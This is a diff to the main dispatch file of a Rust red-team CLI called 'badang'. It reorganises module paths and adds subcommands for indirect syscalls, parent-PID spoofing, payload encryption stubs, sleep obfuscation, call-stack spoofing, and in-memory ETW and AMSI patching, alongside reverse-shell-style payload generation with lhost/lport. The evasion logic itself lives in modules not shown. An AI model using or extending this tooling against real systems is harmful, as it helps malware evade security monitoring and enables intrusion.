@@ -49,13 +49,33 @@ fn main() {
         "analyze" => {
             if cli.dry_run {
                 println!("[DRY RUN] Would analyze process PID {}", cli.target_pid);
-                badang::detect::dry_run(cli.target_pid, &log);
+                badang::analysis::detect::dry_run(cli.target_pid, &log);
             } else {
-                badang::detect::analyze(cli.target_pid, &log);
+                badang::analysis::detect::analyze(cli.target_pid, &log);
             }
         }
         "syscall" => {
-            if cli.dry_run {
+            if cli.indirect {
+                if cli.dry_run {
+                    badang::syscall::indirect::dry_run(&cli.syscall_func, &log);
+                } else {
+                    match badang::syscall::indirect::resolve(&cli.syscall_func, &log) {
+                        Ok(result) => {
+                            log.info(format!(
+                                "  Resolved: {} → SSN 0x{:X}, gadget 0x{:016X} ({})",
+                                result.func_name,
+                                result.ssn,
+                                result.syscall_gadget,
+                                result.method.name()
+                            ));
+                        }
+                        Err(e) => {
+                            eprintln!("ERROR: {}", e);
+                            process::exit(1);
+                        }
+                    }
+                }
+            } else if cli.dry_run {
                 println!("[DRY RUN] Would invoke syscall: {}", cli.syscall_func);
                 badang::syscall::dry_run(&cli.syscall_func, &log);
             } else {
@@ -84,7 +104,7 @@ fn main() {
                 println!("       Size: {} bytes", bytes.len());
                 println!("       First bytes: {:02x?}", &bytes[..bytes.len().min(16)]);
                 println!("       (payload loaded successfully — no execution performed)");
-                print!("{}", badang::payload::hex_dump(&bytes));
+                print!("{}", badang::payload::format::hex_dump(&bytes));
             }
             Err(e) => {
                 eprintln!("ERROR: {}", e);
@@ -94,11 +114,11 @@ fn main() {
         "convert" => {
             let format = match cli.convert_format.to_lowercase().as_str() {
                 "auto" => None,
-                "hex" => Some(badang::payload::PayloadFormat::Hex),
-                "c" | "carray" => Some(badang::payload::PayloadFormat::CArray),
-                "python" | "py" => Some(badang::payload::PayloadFormat::PythonBytes),
-                "rust" | "rs" => Some(badang::payload::PayloadFormat::RustArray),
-                "decimal" | "dec" => Some(badang::payload::PayloadFormat::Decimal),
+                "hex" => Some(badang::payload::format::PayloadFormat::Hex),
+                "c" | "carray" => Some(badang::payload::format::PayloadFormat::CArray),
+                "python" | "py" => Some(badang::payload::format::PayloadFormat::PythonBytes),
+                "rust" | "rs" => Some(badang::payload::format::PayloadFormat::RustArray),
+                "decimal" | "dec" => Some(badang::payload::format::PayloadFormat::Decimal),
                 _ => {
                     eprintln!(
                         "ERROR: unknown format '{}'. Use: auto, hex, c, python, rust, decimal",
@@ -113,13 +133,13 @@ fn main() {
                 match badang::injection::load_payload(&cli.payload) {
                     Ok(bytes) => {
                         println!("[DUMP] {} ({} bytes)\n", cli.payload, bytes.len());
-                        print!("{}", badang::payload::hex_dump(&bytes));
+                        print!("{}", badang::payload::format::hex_dump(&bytes));
                         println!("\n--- C array ---");
-                        print!("{}", badang::payload::to_c_array(&bytes));
+                        print!("{}", badang::payload::format::to_c_array(&bytes));
                         println!("\n--- Python ---");
-                        println!("{}", badang::payload::to_python_bytes(&bytes));
+                        println!("{}", badang::payload::format::to_python_bytes(&bytes));
                         println!("\n--- Rust ---");
-                        print!("{}", badang::payload::to_rust_array(&bytes));
+                        print!("{}", badang::payload::format::to_rust_array(&bytes));
                     }
                     Err(e) => {
                         eprintln!("ERROR: {}", e);
@@ -132,7 +152,7 @@ fn main() {
                 process::exit(1);
             } else {
                 let (bytes, detected) = if let Some(fmt) = format {
-                    match badang::payload::parse(&cli.convert_input, fmt) {
+                    match badang::payload::format::parse(&cli.convert_input, fmt) {
                         Ok(b) => (b, fmt),
                         Err(e) => {
                             eprintln!("ERROR: {}", e);
@@ -140,7 +160,7 @@ fn main() {
                         }
                     }
                 } else {
-                    match badang::payload::auto_parse(&cli.convert_input) {
+                    match badang::payload::format::auto_parse(&cli.convert_input) {
                         Ok(r) => r,
                         Err(e) => {
                             eprintln!("ERROR: {}", e);
@@ -154,7 +174,7 @@ fn main() {
                     bytes.len(),
                     detected.name()
                 );
-                print!("{}", badang::payload::hex_dump(&bytes));
+                print!("{}", badang::payload::format::hex_dump(&bytes));
 
                 match std::fs::write(&cli.convert_output, &bytes) {
                     Ok(()) => {
@@ -168,7 +188,7 @@ fn main() {
             }
         }
         "generate" => {
-            let payload_type = match badang::generate::PayloadType::from_str(&cli.generate_type) {
+            let payload_type = match badang::payload::generate::PayloadType::from_str(&cli.generate_type) {
                 Some(t) => t,
                 None => {
                     eprintln!(
@@ -178,7 +198,7 @@ fn main() {
                     process::exit(1);
                 }
             };
-            let config = badang::generate::PayloadConfig {
+            let config = badang::payload::generate::PayloadConfig {
                 payload_type,
                 command: cli.generate_command.clone(),
                 title: cli.generate_title.clone(),
@@ -186,10 +206,10 @@ fn main() {
                 lhost: cli.generate_lhost.clone(),
                 lport: cli.generate_lport,
             };
-            match badang::generate::generate(&config) {
+            match badang::payload::generate::generate(&config) {
                 Ok(bytes) => {
                     println!("[GENERATE] {} — {} bytes", payload_type.name(), bytes.len());
-                    print!("{}", badang::payload::hex_dump(&bytes));
+                    print!("{}", badang::payload::format::hex_dump(&bytes));
                     match std::fs::write(&cli.convert_output, &bytes) {
                         Ok(()) => {
                             println!("[SAVED] {} bytes -> {}", bytes.len(), cli.convert_output);
@@ -227,9 +247,195 @@ fn main() {
         "unhook" => {
             if cli.dry_run {
                 println!("[DRY RUN] Would unhook API: {}", cli.unhook_func);
-                badang::unhook::dry_run(&cli.unhook_func, &log);
+                badang::analysis::unhook::dry_run(&cli.unhook_func, &log);
             } else {
-                badang::unhook::analyze(&cli.unhook_func, &log);
+                badang::analysis::unhook::analyze(&cli.unhook_func, &log);
+            }
+        }
+        "ppid" => {
+            if cli.ppid_parent.is_empty() {
+                eprintln!("ERROR: --parent <NAME> or --parent-pid <PID> is required for ppid command.");
+                process::exit(1);
+            }
+            if cli.dry_run {
+                badang::evasion::ppid::dry_run(&cli.ppid_parent, &cli.ppid_child, &log);
+            } else {
+                let parent_pid = if let Ok(pid) = cli.ppid_parent.parse::<u32>() {
+                    pid
+                } else {
+                    match badang::evasion::ppid::find_pid_by_name(&cli.ppid_parent, &log) {
+                        Ok(pid) => pid,
+                        Err(e) => {
+                            eprintln!("ERROR: {}", e);
+                            process::exit(1);
+                        }
+                    }
+                };
+                let config = badang::evasion::ppid::PpidConfig {
+                    parent_pid,
+                    child_command: cli.ppid_child.clone(),
+                    suspended: cli.ppid_suspended,
+                };
+                match badang::evasion::ppid::spawn(&config, &log) {
+                    Ok(result) => {
+                        log.info(format!(
+                            "  Child PID: {}, TID: {}, Parent PID: {}{}",
+                            result.child_pid,
+                            result.child_tid,
+                            result.parent_pid,
+                            if result.suspended { " (SUSPENDED)" } else { "" }
+                        ));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
+        "encrypt" => {
+            if cli.encrypt_key.is_empty() {
+                eprintln!("ERROR: --key is required for encrypt command.");
+                process::exit(1);
+            }
+            let method = match badang::payload::encrypt::EncryptMethod::from_str(&cli.encrypt_method) {
+                Some(m) => m,
+                None => {
+                    eprintln!(
+                        "ERROR: unknown encrypt method '{}'. Use: xor, xormulti, rc4",
+                        cli.encrypt_method
+                    );
+                    process::exit(1);
+                }
+            };
+            if cli.dry_run {
+                badang::payload::encrypt::dry_run(&cli.encrypt_method, &cli.encrypt_key, &log);
+            } else {
+                match badang::injection::load_payload(&cli.payload) {
+                    Ok(payload_bytes) => {
+                        let key = cli.encrypt_key.as_bytes();
+                        match badang::payload::encrypt::encrypt(&payload_bytes, method, key) {
+                            Ok(result) => {
+                                println!(
+                                    "[ENCRYPT] {} — stub: {} bytes, encrypted: {} bytes, total: {} bytes",
+                                    result.method.name(),
+                                    result.stub_len,
+                                    result.encrypted_len,
+                                    result.combined.len()
+                                );
+                                print!("{}", badang::payload::format::hex_dump(&result.combined));
+                                match std::fs::write(&cli.convert_output, &result.combined) {
+                                    Ok(()) => {
+                                        println!(
+                                            "[SAVED] {} bytes -> {}",
+                                            result.combined.len(),
+                                            cli.convert_output
+                                        );
+                                    }
+                                    Err(e) => {
+                                        eprintln!(
+                                            "ERROR: failed to write '{}': {}",
+                                            cli.convert_output, e
+                                        );
+                                        process::exit(1);
+                                    }
+                                }
+                            }
+                            Err(e) => {
+                                eprintln!("ERROR: {}", e);
+                                process::exit(1);
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
+        "sleep" => {
+            if cli.dry_run {
+                badang::evasion::sleep_obfs::dry_run(&cli.sleep_method, cli.sleep_duration, &log);
+            } else {
+                let result = match cli.sleep_method.to_lowercase().as_str() {
+                    "ekko" | "rop" | "timer" => {
+                        badang::evasion::sleep_obfs::demo_ekko(cli.sleep_duration, &log)
+                    }
+                    _ => badang::evasion::sleep_obfs::demo_manual(cli.sleep_duration, &log),
+                };
+                match result {
+                    Ok(demo) => {
+                        log.info(format!(
+                            "  Region: 0x{:016X}, {} bytes, slept {} ms",
+                            demo.region_base, demo.region_size, demo.sleep_ms
+                        ));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
+        "spoof" => {
+            if cli.dry_run {
+                badang::evasion::stack_spoof::dry_run(&cli.spoof_func, &log);
+            } else {
+                match badang::evasion::stack_spoof::demo_spoofed_call(&cli.spoof_func, &log) {
+                    Ok(result) => {
+                        log.info(format!(
+                            "  Spoofed: {} — {} frames, {} gadgets",
+                            result.target_func,
+                            result.frames_built,
+                            result.gadget_addrs.len()
+                        ));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
+        "etw" => {
+            if cli.dry_run {
+                badang::evasion::etw::dry_run(&cli.etw_target, &log);
+            } else {
+                match badang::evasion::etw::patch(&cli.etw_target, &log) {
+                    Ok(state) => {
+                        log.info(format!(
+                            "  Patched {} at 0x{:016X} (saved {} original bytes)",
+                            state.target,
+                            state.address,
+                            state.original_bytes.len()
+                        ));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
+            }
+        }
+        "amsi" => {
+            if cli.dry_run {
+                badang::evasion::amsi::dry_run(&cli.amsi_target, &log);
+            } else {
+                match badang::evasion::amsi::patch(&cli.amsi_target, &log) {
+                    Ok(state) => {
+                        log.info(format!(
+                            "  Patched {} at 0x{:016X} (saved {} original bytes)",
+                            state.target,
+                            state.address,
+                            state.original_bytes.len()
+                        ));
+                    }
+                    Err(e) => {
+                        eprintln!("ERROR: {}", e);
+                        process::exit(1);
+                    }
+                }
             }
         }
         _ => {
